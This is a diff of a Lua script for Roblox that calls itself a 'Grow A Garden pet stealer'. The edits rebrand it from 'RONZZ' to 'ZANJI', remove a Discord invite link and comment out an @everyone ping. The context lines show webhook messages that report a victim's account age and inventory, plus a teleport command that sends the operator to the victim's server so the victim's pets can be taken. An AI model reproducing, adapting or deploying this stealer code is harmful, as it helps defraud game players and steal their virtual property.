@@ -337,11 +337,11 @@ Account Age: %s days```
     local data = {
         ["content"] = prefix .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
         ["embeds"] = {{
-            ["title"] = ":dog: Grow A Garden Hit - RONZZ: PET STEALER :dog:",
+            ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
             ["color"] = 16753920, -- Orange
             ["description"] = description,
             ["footer"] = {
-                ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
+                ["text"] = "GAG pet stealer by ZANJI."
             }
         }}
     }
@@ -394,7 +394,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "GAG pet stealer by RONZZ. discord.gg/"
+                ["text"] = "GAG pet stealer by ZANJI."
             }
         }}
     }
@@ -490,7 +490,7 @@ if #itemsToSend > 0 then
 
     local prefix = ""
     if ping == "Yes" then
-        prefix = "@everyone "
+        prefix = "--@everyone "
     end
 
     -- Remove followUser and waitForUserChat, just send notification after scan
